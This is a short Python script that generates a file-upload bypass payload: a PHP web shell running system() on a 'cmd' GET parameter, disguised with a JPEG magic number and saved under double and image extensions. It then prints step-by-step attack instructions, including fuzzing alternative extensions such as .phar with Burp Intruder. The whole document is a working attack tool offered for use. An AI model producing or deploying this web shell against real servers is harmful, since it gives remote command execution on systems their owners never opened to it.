from io import BytesIO

# PHP payload to execute system commands via GET parameter "cmd"
php_content = '''
<?php 
system($_GET["cmd"]);
?>
'''

# JPEG file magic number (header)
jpeg_magic_number = b'\xff\xd8\xff\xe0'

def create_php_to_jpeg_with_magic_number():
    f = BytesIO()
    
    # Write JPEG magic number
    f.write(jpeg_magic_number)
    
    # Write PHP payload
    f.write(php_content.encode('utf-8'))  
    
    # Reset file pointer to the beginning
    f.seek(0)
    
    return f

# Generate and save the PHP-JPEG hybrid file
php_jpeg_file = create_php_to_jpeg_with_magic_number()
with open('phpinfo2.jpeg.php', 'wb') as output_file:
    output_file.write(php_jpeg_file.read())

# Generate and save the PHP-JPEG hybrid file with a .jpeg extension
php_jpeg_file = create_php_to_jpeg_with_magic_number()
with open('phpinfo2.jpeg', 'wb') as output_file:
    output_file.write(php_jpeg_file.read())

# Print attack instructions
print("Files 'phpinfo2.jpeg' and 'phpinfo2.jpeg.php' successfully created with PHP code and JPEG magic number!\n")
print("You can attempt an attack using http://example.com/uploads/phpinfo2.jpeg.php\n")
print("If this fails, use Burp Suite's Intruder tool to test different extensions, such as phpinfo2.jpeg.phar.\n")
print("With Intruder, you can set the payload position and automate extension testing for common vulnerabilities.\n")
